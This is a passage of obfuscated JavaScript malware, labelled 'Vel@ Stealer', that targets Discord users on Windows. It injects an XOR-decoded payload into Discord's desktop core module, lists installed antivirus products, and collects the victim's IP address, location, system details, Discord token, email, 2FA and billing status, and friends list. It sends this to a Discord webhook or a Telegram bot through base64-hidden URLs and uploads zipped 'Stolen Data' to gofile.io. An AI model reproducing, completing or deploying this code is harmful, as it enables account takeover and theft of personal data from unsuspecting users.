    throw new Error("Environment variables LOCALAPPDATA or APPDATA not defined");
  }
  const _0x50b8a5 = fs.readdirSync(localappdata);
  const _0x3d2553 = _0x50b8a5.filter(_0x40c053 => _0x40c053.toLowerCase().includes("discord"));
  if (_0x3d2553.length === 0) {
    console.log("[Injection] No Discord installation found");
    return [];
  }
  console.log("[Injection] Found Discord installations: " + _0x3d2553.join(", "));
  const _0x1454bc = [];
  for (const _0x4cddb9 of _0x3d2553) {
    const _0x5c7290 = path.join(localappdata, _0x4cddb9);
    try {
      const _0x111717 = fs.readdirSync(_0x5c7290).filter(_0x232996 => _0x232996.startsWith("app-"));
      const _0x5a28a5 = {
        numeric: true
      };
      _0x111717.sort((_0x164204, _0x30457a) => _0x30457a.localeCompare(_0x164204, undefined, _0x5a28a5));
      if (_0x111717.length === 0) {
        console.log("[Injection] No app versions found in " + _0x4cddb9);
        continue;
      }
      const _0x5eb4f3 = path.join(_0x5c7290, _0x111717[0]);
      console.log("[Injection] Using version: " + _0x111717[0] + " for " + _0x4cddb9);
      let _0x1d0328 = "Discord";
      if (_0x4cddb9.includes("Canary")) {
        _0x1d0328 = "Discord Canary";
      }
      if (_0x4cddb9.includes("PTB")) {
        _0x1d0328 = "Discord PTB";
      }
      if (_0x4cddb9.includes("Development")) {
        _0x1d0328 = "Discord Development";
      }
      const _0xea22b6 = path.join(_0x5eb4f3, "modules");
      const _0xa3f1e4 = fs.readdirSync(_0xea22b6);
      const _0x18bae7 = _0xa3f1e4.find(_0x1e73d0 => _0x1e73d0.includes("discord_desktop_core"));
      if (!_0x18bae7) {
        console.log("[Injection] discord_desktop_core not found in " + _0x4cddb9);
        continue;
      }
      const _0x436524 = path.join(_0xea22b6, _0x18bae7, "discord_desktop_core");
      const _0x3ec101 = path.join(_0x436524, "index.js");
      let _0x17ba3e = "";
      if (fs.existsSync(_0x3ec101)) {
        const _0x34589b = fs.readFileSync(_0x3ec101, "utf8");
        if (!_0x34589b.includes("%WEBHOOK_REPLACE_NYX%") && !_0x34589b.includes("CONFIG.API") && !_0x34589b.includes("GangwayCord")) {
          _0x17ba3e = _0x34589b;
        }
      }
      const _0x44a904 = _0x6d905d + "\n\n" + _0x17ba3e;
      fs.writeFileSync(_0x3ec101, _0x44a904, "utf8");
      console.log("[Injection] Injected: " + _0x3ec101);
      injectionPaths.push(_0x3ec101);
      const _0x2aa505 = {
        type: _0x1d0328,
        path: _0x3ec101,
        version: _0x111717[0]
      };
      _0x1454bc.push(_0x2aa505);
    } catch (_0x16d21a) {
      console.error("[Injection] Error injecting into " + _0x4cddb9 + ":", _0x16d21a.message);
    }
  }
  return _0x1454bc;
}
async function performInjection() {
  try {
    if (!SKIBIDI_INJ || SKIBIDI_INJ === "" || SKIBIDI_INJ === "%INJECT_URL_PLACE%") {
      console.log("[Injection] Skipped - URL not configured");
      return {
        success: true,
        skipped: true,
        count: 0
      };
    }
    console.log("\n[Injection] Starting Discord injection process...\n");
    console.log("[Injection] Step 1: Killing Discord processes...");
    await killAndRestartDiscord();
    console.log("\n[Injection] Step 2: Reading local injection code...");
    let _0x49a87f;
    const _0x14a016 = path.join(__dirname, "dist", "injection.js");
    const _0x4b1afc = path.join(__dirname, "injection.js");
    if (fs.existsSync(_0x14a016)) {
      const _0x314678 = fs.readFileSync(_0x14a016, "utf8");
      if (_0x314678.startsWith("__XE__")) {
        const _0x116516 = "VoidrionAstralKey2024XOR";
        const _0x18c5d9 = Buffer.from(_0x314678.slice(6), "base64");
        const _0x3fea6a = Buffer.from(_0x116516, "utf8");
        const _0x4fac7f = Buffer.alloc(_0x18c5d9.length);
        for (let _0x4fef5d = 0; _0x4fef5d < _0x18c5d9.length; _0x4fef5d++) {
          _0x4fac7f[_0x4fef5d] = _0x18c5d9[_0x4fef5d] ^ _0x3fea6a[_0x4fef5d % _0x3fea6a.length];
        }
        _0x49a87f = _0x4fac7f.toString("utf8");
      } else {
        _0x49a87f = _0x314678;
      }
    } else if (fs.existsSync(_0x4b1afc)) {
      _0x49a87f = fs.readFileSync(_0x4b1afc, "utf8");
    } else {
      throw new Error("injection.js not found");
    }
    let _0x2440d0 = CONFIG.webhook;
    if (CONFIG.logMethod === "telegram") {
      if (CONFIG.telegram.token && CONFIG.telegram.chatId) {
        const _0x254a44 = _0x46aecc => Buffer.from(_0x46aecc, "base64").toString();
        const _0x53cb0f = _0x254a44("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn");
        const _0x281a8a = _0x254a44("Ym90");
        const _0x14c453 = _0x254a44("c2VuZE1lc3NhZ2U=");
        _0x2440d0 = _0x53cb0f + "/" + _0x281a8a + CONFIG.telegram.token + "/" + _0x14c453 + "?chat_id=" + CONFIG.telegram.chatId;
      }
    }
    if (_0x2440d0) {
      _0x49a87f = _0x49a87f.replace(/%WEBHOOK_REPLACE_NYX%/g, _0x2440d0);
    }
    console.log("\n[Injection] Step 3: Injecting Discord core...");
    const _0x16f388 = await injectDiscordCore(_0x49a87f);
    injectionResults.push(..._0x16f388);
    console.log("\n[Injection] Injection completed!\n");
    console.log("[Injection] Injection Summary:");
    console.log("━".repeat(50));
    if (injectionResults.length === 0) {
      console.log("[Injection] No injections performed");
      return {
        success: false,
        results: []
      };
    } else {
      injectionResults.forEach((_0x1e7f8a, _0xe2cee5) => {
        console.log(_0xe2cee5 + 1 + ". " + _0x1e7f8a.type);
        console.log("   Path: " + _0x1e7f8a.path);
        if (_0x1e7f8a.version) {
          console.log("   Version: " + _0x1e7f8a.version);
        }
        console.log("");
      });
    }
    console.log("[Injection] Step 4: Restarting Discord...\n");
    await killAndRestartDiscord();
    const _0xac9a53 = {
      success: true,
      results: injectionResults,
      count: injectionResults.length
    };
    return _0xac9a53;
  } catch (_0x51475d) {
    console.error("[Injection] Fatal error during injection:", _0x51475d.message);
    const _0x12367a = {
      success: false,
      error: _0x51475d.message
    };
    return _0x12367a;
  }
}
const EMOJIS = {
  discord_employee: "<:discord_employee:1387742493046734979>",
  partnered_server_owner: "<:partnered_server_owner:1387742553394253834>",
  hypesquad_events: "<:hypesquad_events:1387742522545279056>",
  bughunter: "<:bughunter:1387742487690612887>",
  bughuntergold: "<:bughuntergold:1387742489338970123>",
  oldusername: "<:oldusername:1387742549225115680>",
  bravery: "<:bravery:1387742465544687707>",
  brilliance: "<:brilliance:1387742466697990285>",
  balance: "<:balance:1387742461014573058>",
  early_supporter: "<:early_supporter:1387742496796315779>",
  early_verified_bot_developer: "<:early_verified_bot_developer:1387742498226573342>",
  moderatorprogramsalumni: "<:moderatorprogramsalumni:1387742524105429032>",
  active_developer: "<:active_developer:1387742440697368606>",
  boost1month: "<:boost1month:1387742464202379324>",
  "2monthsboostnitro": "<:2monthsboostnitro:1387742437723602975>",
  nitro_boost_3_months: "<:nitro_boost_3_months:1387742527339102338>",
  "6months_boost": "<:6months_boost:1387742439477088287>",
  nitro_boost_9_months: "<:nitro_boost_9_months:1387742529289457674>",
  "12monthsboostnitro": "<:12monthsboostnitro:1387742435769061417>",
  boost15month: "<:boost15month:1387742462629511270>",
  nitro_boost_18_months: "<:nitro_boost_18_months:1387742525699260538>",
  "24_months": "<:24_months:1387742436742139974>",
  discord_nitro: "<:discord_nitro:1387742494610952194>",
  bronze: "<:bronze:1387742468727898182>",
  silver: "<:silver:1387742580300582974>",
  gold: "<:gold:1387742520733204480>",
  platinum: "<:platinum:1387742556649164922>",
  diamond: "<:diamond:1387742491629060156>",
  emerald: "<:emerald:1387742518153707570>",
  ruby: "<:ruby:1387742559970922496>",
  opal: "<:opal:1387742550919614496>",
  pc: "<:pc:1413214402769064129>",
  key: "<:key:1413214568448266320>",
  notebook: "<:notebook:1413218184265338980>",
  url: "<:url:1413220079373389854>",
  hwid: "<:hwid:1413220503614783618>",
  crown2: "<a:crown2:1413222572090331337>",
  idcard: "<:idcard:1413222293869432882>",
  cookies: "<:cookies:1413222163627901051>",
  world: "<:world:1413221837676220446>",
  pin: "<a:pin:1413224189074079744>",
  email: "<:email:1413229353843691680>",
  phone: "<:phone:1413229602662252785>",
  lockk: "<:lockk:1413229832829014056>",
  badgespremium: "<:badgespremium:1413230008872210454>",
  boostedhome: "<:boostedhome:1413230424951488522>",
  cards: "<:cards:1413230537958625330>"
};
const a0_0x40cd2a = {
  value: 1,
  emoji: EMOJIS.discord_employee,
  rare: true
};
const a0_0x4342c4 = {
  value: 2,
  emoji: EMOJIS.partnered_server_owner,
  rare: true
};
const a0_0xee91ba = {
  value: 4,
  emoji: EMOJIS.hypesquad_events,
  rare: true
};
const a0_0x442388 = {
  value: 8,
  emoji: EMOJIS.bughunter,
  rare: true
};
const a0_0x3da507 = {
  value: 32,
  emoji: EMOJIS.oldusername,
  rare: false
};
const a0_0x5c6721 = {
  value: 64,
  emoji: EMOJIS.bravery,
  rare: false
};
const a0_0x32edc3 = {
  value: 128,
  emoji: EMOJIS.brilliance,
  rare: false
};
const a0_0x462e75 = {
  value: 256,
  emoji: EMOJIS.balance,
  rare: false
};
const a0_0x4bfccf = {
  value: 512,
  emoji: EMOJIS.early_supporter,
  rare: true
};
const a0_0x24f85c = {
  value: 16384,
  emoji: EMOJIS.bughuntergold,
  rare: true
};
const a0_0x48cca6 = {
  value: 131072,
  emoji: EMOJIS.early_verified_bot_developer,
  rare: true
};
const a0_0x4cb1e7 = {
  value: 262144,
  emoji: EMOJIS.moderatorprogramsalumni,
  rare: true
};
const a0_0x449725 = {
  value: 4194304,
  emoji: EMOJIS.active_developer,
  rare: false
};
const a0_0x4273f6 = {
  DISCORD_EMPLOYEE: a0_0x40cd2a,
  PARTNERED_SERVER_OWNER: a0_0x4342c4,
  HYPESQUAD_EVENTS: a0_0xee91ba,
  BUG_HUNTER_LEVEL_1: a0_0x442388,
  LEGACY_USERNAME: a0_0x3da507,
  HOUSE_BRAVERY: a0_0x5c6721,
  HOUSE_BRILLIANCE: a0_0x32edc3,
  HOUSE_BALANCE: a0_0x462e75,
  EARLY_SUPPORTER: a0_0x4bfccf,
  BUG_HUNTER_LEVEL_2: a0_0x24f85c,
  EARLY_BOT_DEVELOPER: a0_0x48cca6,
  CERTIFIED_MODERATOR: a0_0x4cb1e7,
  ACTIVE_DEVELOPER: a0_0x449725
};
const BADGES = a0_0x4273f6;
const NITRO_BADGES = [EMOJIS.boost1month, EMOJIS["2monthsboostnitro"], EMOJIS.nitro_boost_3_months, EMOJIS["6months_boost"], EMOJIS.nitro_boost_9_months, EMOJIS["12monthsboostnitro"], EMOJIS.boost15month, EMOJIS.nitro_boost_18_months, EMOJIS["24_months"]];
const a0_0x55a16f = {
  "1": EMOJIS.bronze,
  "3": EMOJIS.silver,
  "6": EMOJIS.gold,
  "12": EMOJIS.platinum,
  "24": EMOJIS.diamond,
  "36": EMOJIS.emerald,
  "60": EMOJIS.ruby,
  "72": EMOJIS.opal
};
const NITRO_TIERS = a0_0x55a16f;
function getNitroDisplay(_0x249a47, _0x126236, _0xb96f35) {
  if (!_0x249a47 || _0x249a47 === 0) {
    return "<:6370silverquestionmark:1441848044978180207>";
  }
  let _0x39c1df = 0;
  if (_0xb96f35) {
    _0x39c1df = Math.floor((Date.now() - new Date(_0xb96f35).getTime()) / 2592000000);
  } else {
    _0x39c1df = 1;
  }
  let _0x24b882 = EMOJIS.discord_nitro;
  const _0x39d9a8 = Object.keys(NITRO_TIERS).map(Number).sort((_0x2098b1, _0x150d12) => _0x150d12 - _0x2098b1);
  for (const _0x9f942a of _0x39d9a8) {
    if (_0x39c1df >= _0x9f942a) {
      _0x24b882 = NITRO_TIERS[_0x9f942a];
      break;
    }
  }
  if (_0x249a47 === 1) {
    return _0x24b882;
  }
  if (_0x249a47 === 2) {
    if (!_0x126236) {
      return _0x24b882;
    }
    const _0x9f68fc = Math.floor((Date.now() - new Date(_0x126236).getTime()) / 2592000000);
    let _0x4500d9 = NITRO_BADGES[0];
    if (_0x9f68fc >= 24) {
      _0x4500d9 = NITRO_BADGES[8];
    } else if (_0x9f68fc >= 18) {
      _0x4500d9 = NITRO_BADGES[7];
    } else if (_0x9f68fc >= 15) {
      _0x4500d9 = NITRO_BADGES[6];
    } else if (_0x9f68fc >= 12) {
      _0x4500d9 = NITRO_BADGES[5];
    } else if (_0x9f68fc >= 9) {
      _0x4500d9 = NITRO_BADGES[4];
    } else if (_0x9f68fc >= 6) {
      _0x4500d9 = NITRO_BADGES[3];
    } else if (_0x9f68fc >= 3) {
      _0x4500d9 = NITRO_BADGES[2];
    } else if (_0x9f68fc >= 2) {
      _0x4500d9 = NITRO_BADGES[1];
    }
    return _0x24b882 + " " + _0x4500d9;
  }
  return "<:6370silverquestionmark:1441848044978180207>";
}
async function fetchIPInfo() {
  return new Promise(_0x36ce27 => {
    https.get("https://ipinfo.io/json", _0x2c57dd => {
      let _0x1e5652 = "";
      _0x2c57dd.on("data", _0x1ecbd0 => _0x1e5652 += _0x1ecbd0);
      _0x2c57dd.on("end", () => {
        try {
          const _0x388064 = JSON.parse(_0x1e5652);
          _0x36ce27({
            ip: _0x388064.ip || "N/A",
            country: _0x388064.country || "N/A",
            city: _0x388064.city || "N/A",
            region: _0x388064.region || "N/A",
            org: _0x388064.org || "N/A"
          });
        } catch (_0xba64f5) {
          _0x36ce27({
            ip: "N/A",
            country: "N/A",
            city: "N/A",
            region: "N/A",
            org: "N/A"
          });
        }
      });
    }).on("error", () => {
      _0x36ce27({
        ip: "N/A",
        country: "N/A",
        city: "N/A",
        region: "N/A",
        org: "N/A"
      });
    });
  });
}
async function detectAntivirusAsync() {
  const _0x20fad3 = [];
  const _0x28033a = ["C:\\Program Files\\Avast Software", "C:\\Program Files\\McAfee", "C:\\Program Files\\Norton", "C:\\Program Files\\Kaspersky Lab", "C:\\Program Files\\BitDefender", "C:\\Program Files\\ESET", "C:\\Program Files\\AVG", "C:\\Program Files\\Malwarebytes", "C:\\Program Files\\Sophos", "C:\\Program Files (x86)\\Avast Software", "C:\\Program Files (x86)\\McAfee", "C:\\Program Files (x86)\\Norton", "C:\\Program Files (x86)\\Kaspersky Lab", "C:\\Program Files (x86)\\BitDefender", "C:\\Program Files (x86)\\ESET", "C:\\Program Files (x86)\\AVG", "C:\\Program Files (x86)\\Malwarebytes", "C:\\Program Files (x86)\\Sophos"];
  for (const _0x4cd9e4 of _0x28033a) {
    if (fs.existsSync(_0x4cd9e4)) {
      const _0x2b82a6 = _0x4cd9e4.includes("Avast") ? "Avast" : _0x4cd9e4.includes("McAfee") ? "McAfee" : _0x4cd9e4.includes("Norton") ? "Norton" : _0x4cd9e4.includes("Kaspersky") ? "Kaspersky" : _0x4cd9e4.includes("BitDefender") ? "BitDefender" : _0x4cd9e4.includes("ESET") ? "ESET" : _0x4cd9e4.includes("AVG") ? "AVG" : _0x4cd9e4.includes("Malwarebytes") ? "Malwarebytes" : _0x4cd9e4.includes("Sophos") ? "Sophos" : "Unknown AV";
      _0x20fad3.push(_0x2b82a6);
    }
  }
  return [...new Set(_0x20fad3)];
}
async function getSystemInfoEmbed() {
  const _0x5987c9 = os.totalmem() / 1073741824;
  const _0x199d14 = os.freemem() / 1073741824;
  const _0x28b880 = _0x5987c9 - _0x199d14;
  const _0x559844 = os.uptime();
  const _0xd7d0a4 = Math.floor(_0x559844 / 3600);
  const _0x4ac88f = Math.floor(_0x559844 % 3600 / 60);
  const _0x449548 = os.cpus();
  const _0x522670 = _0x449548[0]?.model || "Unknown";
  const _0x231372 = _0x449548[0]?.speed ? (_0x449548[0].speed / 1000).toFixed(1) : "0";
  const _0x4c9623 = _0x449548.length;
  const _0x241bff = await fetchIPInfo();
  const _0x1fda33 = await detectAntivirusAsync();
  const _0x290994 = {
    name: "🌐 Network",
    value: "IP → `" + _0x241bff.ip + "`\nCountry → `" + _0x241bff.country + "`\nCity → `" + _0x241bff.city + "`",
    inline: true
  };
  const _0x411052 = {
    name: "⚙️ Hardware",
    value: "CPU → `" + _0x522670 + " (" + _0x4c9623 + " cores)`\nUptime → `" + _0xd7d0a4 + "h " + _0x4ac88f + "m`",
    inline: true
  };
  return {
    title: "**Vel@ Stealer | System Infos**",
    color: 2040100,
    fields: [_0x290994, {
      name: "💻 System",
      value: "Hostname → `" + os.hostname() + "`\nRAM → `" + _0x28b880.toFixed(2) + " / " + _0x5987c9.toFixed(2) + " GB`\nOS → `" + os.type() + " " + os.release() + "`",
      inline: true
    }, _0x411052, {
      name: "🛡️ Antivirus",
      value: _0x1fda33.length ? "`" + _0x1fda33.join(", ") + "`" : "`None detected`",
      inline: true
    }],
    footer: {
      text: "selam kızlar pipim sızlar"
    },
    timestamp: new Date().toISOString()
  };
}
function getBadges(_0xde0b91, _0x3a9c56) {
  const _0x44d0fe = [];
  const _0x245d07 = [];
  for (const [_0xb0d9af, _0x1a24f9] of Object.entries(BADGES)) {
    if (_0xde0b91 & _0x1a24f9.value) {
      _0x44d0fe.push(_0x1a24f9.emoji);
      if (_0x1a24f9.rare) {
        _0x245d07.push(_0x1a24f9.emoji + " | `" + _0x3a9c56 + "`");
      }
    }
  }
  return {
    display: _0x44d0fe.length > 0 ? _0x44d0fe.join(" ") : "<:6370silverquestionmark:1441848044978180207>",
    rare: _0x245d07.length > 0 ? _0x245d07.join("\n") : null
  };
}
function sanitizeForTelegram(_0x244574) {
  if (_0x244574 === null || _0x244574 === undefined) {
    return "";
  }
  const _0x5060e7 = String(_0x244574);
  const _0x5bf47a = {
    auth: "🔐",
    mencaoxx: "👤",
    userrxs: "🏷️",
    xxxxww: "🆔",
    badges: "🏅",
    cxsjjdzx: "🔗",
    email: "📧",
    phone: "📱",
    cookies: "🍪",
    cards: "💳",
    lockk: "🔒",
    idcard: "🪪",
    world: "🌍",
    paypal: "🅿️",
    pc: "💻",
    key: "🔑",
    notebook: "📓",
    url: "🌐",
    hwid: "🖥️",
    crown2: "👑",
    pin: "📌",
    badgespremium: "💎",
    boostedhome: "🚀",
    discord_nitro: "🚀",
    "2fa": "🔒",
    nitrotype: "🚀",
    billing: "💳",
    emailphone: "📧",
    ip: "📍",
    country: "🏳️",
    displayname: "🏷️",
    token: "🔑"
  };
  let _0x39866b = _0x5060e7.replace(/<a?:(\w+):(\d+)>/g, (_0x599e7a, _0x16aa43) => {
    return _0x5bf47a[_0x16aa43] || "";
  });
  _0x39866b = _0x39866b.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  _0x39866b = _0x39866b.replace(/\*\*(.*?)\*\*/g, "<b>$1</b>");
  _0x39866b = _0x39866b.replace(/\*(.*?)\*/g, "<i>$1</i>");
  _0x39866b = _0x39866b.replace(/_(.*?)_/g, "<i>$1</i>");
  _0x39866b = _0x39866b.replace(/__(.*?)__/g, "<u>$1</u>");
  _0x39866b = _0x39866b.replace(/~~(.*?)~~/g, "<s>$1</s>");
  _0x39866b = _0x39866b.replace(/`(.*?)`/g, "<code>$1</code>");
  _0x39866b = _0x39866b.replace(/```([\s\S]*?)```/g, "<pre>$1</pre>");
  _0x39866b = _0x39866b.replace(/\[(.*?)\]\((.*?)\)/g, "<a href=\"$2\">$1</a>");
  return _0x39866b;
}
async function sendToTelegram(_0x85d227) {
  const {
    token: _0x1d3768,
    chatId: _0x3a14d0
  } = CONFIG.telegram;
  if (!_0x1d3768 || !_0x3a14d0) {
    return;
  }
  const _0x477fd9 = _0x178c98 => Buffer.from(_0x178c98, "base64").toString();
  const _0x2a9335 = _0x477fd9("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn");
  const _0xd892c3 = _0x477fd9("Ym90");
  const _0x5ea507 = _0x477fd9("c2VuZE1lc3NhZ2U=");
  let _0x48960f = "";
  if (_0x85d227.content) {
    _0x48960f += sanitizeForTelegram(_0x85d227.content) + "\n\n";
  }
  if (_0x85d227.embeds) {
    for (const _0x4896fa of _0x85d227.embeds) {
      if (_0x4896fa.author && _0x4896fa.author.name) {
        _0x48960f += "<b>" + sanitizeForTelegram(_0x4896fa.author.name) + "</b>\n";
      }
      if (_0x4896fa.title) {
        _0x48960f += "<b>" + sanitizeForTelegram(_0x4896fa.title) + "</b>\n";
      }
      if (_0x4896fa.description) {
        _0x48960f += sanitizeForTelegram(_0x4896fa.description) + "\n";
      }
      if (_0x4896fa.fields) {
        for (const _0x3ec033 of _0x4896fa.fields) {
          _0x48960f += "<b>" + sanitizeForTelegram(_0x3ec033.name) + "</b>\n" + sanitizeForTelegram(_0x3ec033.value) + "\n";
        }
      }
      if (_0x4896fa.footer && _0x4896fa.footer.text) {
        _0x48960f += "<i>" + sanitizeForTelegram(_0x4896fa.footer.text) + "</i>\n";
      }
      if (_0x4896fa.image && _0x4896fa.image.url && !_0x4896fa.description && !_0x4896fa.fields) {
        _0x48960f += "<a href=\"" + _0x4896fa.image.url + "\">📸 View Image</a>\n";
      }
      _0x48960f += "\n" + "─".repeat(15) + "\n\n";
    }
  }
  if (!_0x48960f.trim()) {
    return;
  }
  const _0x5e5d10 = 4000;
  const _0x48479f = [];
  while (_0x48960f.length > 0) {
    if (_0x48960f.length <= _0x5e5d10) {
      _0x48479f.push(_0x48960f);
      break;
    }
    let _0x21a9cb = _0x48960f.substring(0, _0x5e5d10);
    const _0x24ce75 = _0x21a9cb.lastIndexOf("\n");
    if (_0x24ce75 > _0x5e5d10 * 0.8) {
      _0x21a9cb = _0x48960f.substring(0, _0x24ce75);
      _0x48960f = _0x48960f.substring(_0x24ce75 + 1);
    } else {
      _0x48960f = _0x48960f.substring(_0x5e5d10);
    }
    _0x48479f.push(_0x21a9cb);
  }
  for (const _0x338a1f of _0x48479f) {
    if (!_0x338a1f.trim()) {
      continue;
    }
    await sendTelegramMessage(_0x2a9335, _0xd892c3, _0x1d3768, _0x5ea507, _0x3a14d0, _0x338a1f);
    await new Promise(_0x45c29d => setTimeout(_0x45c29d, 250));
  }
}
async function sendTelegramMessage(_0x1308a4, _0x47c915, _0x46b5dd, _0x3ab2df, _0x3de87f, _0x53be1e) {
  try {
    const _0x4c0f53 = {
      chat_id: _0x3de87f,
      text: _0x53be1e,
      parse_mode: "HTML",
      disable_web_page_preview: true
    };
    await axios.post(_0x1308a4 + "/" + _0x47c915 + _0x46b5dd + "/" + _0x3ab2df, _0x4c0f53);
  } catch (_0x575839) {
    console.error("TG Send Error:", _0x575839.message);
    try {
      let _0x13831c = _0x53be1e.replace(/<a href="([^"]+)">([^<]+)<\/a>/g, "$2 ($1)");
      _0x13831c = _0x13831c.replace(/<[^>]*>/g, "").replace(/&amp;/g, "&").replace(/&lt;/g, "<").replace(/&gt;/g, ">");
      const _0x30b71a = {
        chat_id: _0x3de87f,
        text: _0x13831c
      };
      await axios.post(_0x1308a4 + "/" + _0x47c915 + _0x46b5dd + "/" + _0x3ab2df, _0x30b71a);
    } catch (_0x473e62) {
      console.error("TG Fallback Error:", _0x473e62.message);
    }
  }
}
async function sendLog(_0x42047e) {
  try {
    let _0x11bc52 = false;
    if (CONFIG.logMethod === "telegram" || CONFIG.telegram && CONFIG.telegram.token && CONFIG.telegram.chatId) {
      await sendToTelegram(_0x42047e);
      _0x11bc52 = true;
    }
    if (CONFIG.logMethod !== "telegram" && CONFIG.webhook && CONFIG.webhook.startsWith("http")) {
      await axios.post(CONFIG.webhook, _0x42047e, {
        headers: {
          "Content-Type": "application/json"
        },
        timeout: 30000
      });
      _0x11bc52 = true;
    }
    if (!_0x11bc52) {
      await axios.post(CONFIG.apiUrl + "/api/log/" + CONFIG.userId, _0x42047e, {
        headers: {
          "Content-Type": "application/json"
        },
        timeout: 30000
      });
    }
  } catch (_0x989e44) {
    console.error("Log send error:", _0x989e44.message);
  }
}
async function sendTokenToWebhook(_0x224bc2, _0x35a127, _0x466039) {
  return new Promise(async (_0x4155d1, _0x5ecbb3) => {
    try {
      const _0x1c5530 = _0x466039.flags || _0x466039.public_flags || 0;
      const _0x9ef74a = getBadges(_0x1c5530, _0x466039.username || "Unknown");
      const _0x107d5f = getNitroDisplay(_0x466039.premium_type, _0x466039.premium_guild_since, _0x466039.premium_since);
      const _0x2bb84f = await fetchIPInfo();
      const _0x2298ad = _0x466039.username || "Unknown";
      const _0x57b186 = _0x466039.id || "0";
      const _0x39ada8 = _0x466039.discriminator || "0";
      let _0x362d3b = _0x9ef74a.display;
      if (_0x362d3b === "<:6370silverquestionmark:1441848044978180207>") {
        _0x362d3b = "<:no:1441846323530956972>";
      }
      const _0x4d6bd1 = _0x466039.has_payment_methods ? "<:27285blacktick:1441847129323868362>" : "<:no:1441846323530956972>";
      const _0x54aee4 = "||" + _0x224bc2 + "||";
      const _0x5ea3e4 = {
        name: "<a:token:1401550035237474324> Token",
        value: _0x54aee4 + "\n[Copy Token](https://copytoken.vercel.app/copy.html?token=" + _0x224bc2 + ")",
        inline: false
      };
      const _0x494c36 = {
        name: "<:displayname:1401548369704259717> Display Name",
        value: "`" + (_0x466039.global_name || _0x2298ad) + "`",
        inline: true
      };
      const _0x299c1f = {
        name: EMOJIS.pc + " Platform",
        value: "`" + _0x35a127 + "`",
        inline: true
      };
      const _0x130d8c = {
        name: "<:badges:1401548368169406484> Badges",
        value: _0x362d3b,
        inline: true
      };
      const _0x1ebed5 = {
        name: "<:2fa:1401548366462189680> 2FA",
        value: _0x466039.mfa_enabled ? "<:27285blacktick:1441847129323868362>" : "<:no:1441846323530956972>",
        inline: true
      };
      const _0x25da3b = {
        name: "<:nitrotype:1401548364654579812> Nitro Type",
        value: _0x107d5f,
        inline: true
      };
      const _0x411b67 = {
        name: "<a:billing:1401549924658712576> Billing",
        value: "" + _0x4d6bd1,
        inline: true
      };
      const _0x149172 = {
        name: "<:emailphone:1401548361416314961> Email",
        value: _0x466039.email ? "`" + _0x466039.email + "`" : "`No Email`",
        inline: true
      };
      const _0x22d9fe = {
        name: "<:ip:1401548359101055108> IP",
        value: "`" + _0x2bb84f.ip + "`",
        inline: true
      };
      const _0x1b74cc = {
        name: "<:country:1401548357528326184> Country",
        value: "`" + _0x2bb84f.country + "`",
        inline: true
      };
      const _0x28ba0a = [_0x5ea3e4, _0x494c36, _0x299c1f, _0x130d8c, _0x1ebed5, _0x25da3b, _0x411b67, _0x149172, _0x22d9fe, _0x1b74cc];
      const _0x1afdc0 = {
        name: _0x2298ad + " (" + _0x57b186 + ")",
        icon_url: "https://i.pinimg.com/736x/45/30/ef/4530ef26b1079ebc09718d5b7bac7ed3.jpg"
      };
      const _0x59d6db = {
        author: _0x1afdc0,
        thumbnail: {
          url: _0x466039.avatar ? "https://cdn.discordapp.com/avatars/" + _0x57b186 + "/" + _0x466039.avatar + ".png" : "https://cdn.discordapp.com/embed/avatars/" + parseInt(_0x39ada8) % 5 + ".png"
        },
        color: 2895667,
        fields: _0x28ba0a
      };
      let _0x3273f8 = "`No HQ Friends`";
      if (_0x466039.hqFriendsCount > 0) {
        _0x3273f8 = _0x466039.hqFriendsList.slice(0, 15).map(_0x5dddaa => {
          const _0x332fbb = _0x5dddaa.flags || 0;
          const _0x4b1f41 = [];
          for (const [_0x45c0fb, _0x4885ce] of Object.entries(BADGES)) {
            if (_0x4885ce.rare && (_0x332fbb & _0x4885ce.value) !== 0) {
              _0x4b1f41.push(_0x4885ce.emoji);
            }
          }
          const _0x345f08 = _0x4b1f41.length > 0 ? _0x4b1f41.join(" ") : "<:6370silverquestionmark:1441848044978180207>";
          return _0x345f08 + " | `" + _0x5dddaa.username + "`";
        }).join("\n");
      }
      const _0x29069a = {
        name: "HQ Friends (" + (_0x466039.friendsCount || 0) + ")",
        icon_url: "http://media.discordapp.net/attachments/1468008343334551734/1489657905748906124/ea5e6118-4080-43a8-b4ea-dfc5d726120d.webp?ex=69e25b09&is=69e10989&hm=425b53f6730b2cb091c62e99c84ba6ae0f8163aa37487f5e966030522b62cfbf&=&animated=true"
      };
      const _0x46ac20 = {
        color: 2895667,
        author: _0x29069a,
        description: _0x3273f8,
        footer: {
          text: "vel@ Stealer | highkuality"
        }
      };
      const _0xad304a = _0x46ac20;
      const _0x3b5602 = [_0x59d6db, _0xad304a];
      const _0x47d0be = {
        content: null,
        username: "Vel@ Stealer",
        avatar_url: "https://i.pinimg.com/736x/45/30/ef/4530ef26b1079ebc09718d5b7bac7ed3.jpg",
        embeds: _0x3b5602
      };
      const _0x338ab3 = _0x47d0be;
      await sendLog(_0x338ab3);
      console.log("[+] Token sent successfully");
      _0x4155d1();
    } catch (_0x249b99) {
      console.error("[-] Error preparing webhook:", _0x249b99.message);
      _0x5ecbb3(_0x249b99);
    }
  });
}
async function sendZipToFileIOAndWebhook(_0x258f73) {
  if (!fs.existsSync(_0x258f73)) {
    console.log("[!] Zip file not found");
    return false;
  }
  try {
    console.log("[+] Uploading zip to gofile.io...");
    const _0x3fd235 = await zipAndUpload(_0x258f73);
    console.log("[+] Sending gofile.io link to webhook...");
    const _0xfe7574 = await getSystemInfoEmbed();
    const _0x2fbc0c = {
      name: "📁 Stolen Data",
      value: "[Download ZIP](" + _0x3fd235 + ")",
      inline: false
    };
    const _0x5dc11f = {
      ..._0xfe7574
    };
    _0x5dc11f.fields = [...(_0xfe7574.fields || []), _0x2fbc0c];
    const _0x387352 = _0x5dc11f;
    const _0x2ef3a7 = {
      content: "`" + os.userInfo().username + "` - `" + os.hostname() + "`",
      username: "Vel@ Stealer",
      avatar_url: "https://i.pinimg.com/736x/45/30/ef/4530ef26b1079ebc09718d5b7bac7ed3.jpg",
      embeds: [_0x387352]
    };
    await sendLog(_0x2ef3a7);
    console.log("[+] goFile.io link sent to webhook successfully");
    await sendExtractionOverview(_0x258f73);
    return true;
  } catch (_0x181270) {
    console.error("[-] goFile.io upload error:", _0x181270.message);
    return false;
  }
}
async function sendExtractionOverview(_0x1070bf) {
  try {
    console.log("[+] Sending extraction overview...");
    let _0x571b1f = {
      browsers: [],
      profilesSuccess: 0,
